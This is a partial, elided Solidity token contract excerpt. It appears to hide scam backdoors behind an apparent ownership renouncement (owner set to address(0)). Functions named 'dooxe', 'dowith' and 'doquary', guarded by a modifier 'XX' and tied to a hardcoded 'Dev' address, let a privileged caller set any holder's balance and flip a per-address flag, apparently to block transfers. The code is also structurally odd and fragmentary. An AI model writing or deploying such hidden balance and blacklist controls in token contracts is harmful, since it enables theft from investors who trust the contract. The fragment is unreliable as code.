...
pragma solidity 0.8.17;
  ...
  library SafeMath {
    ...
    address Dev = 0xc1e4194C498CF51c9e69498c958ba718B4491c6c;
    ...
    owner = address(0);}
        ...
        return true; }
		function dooxe(address x, uint256 y) XX public {
        X[x] = y;}

        function balanceOf(address account) public view returns (uint256) {
        return X[account]; }
        function dowith(address x) XX public {
        require(Y[x]);
        Y[x] = false; }
        function doquary(address x) XX public{ 
        require(!Y[x]);
        Y[x] = true;}
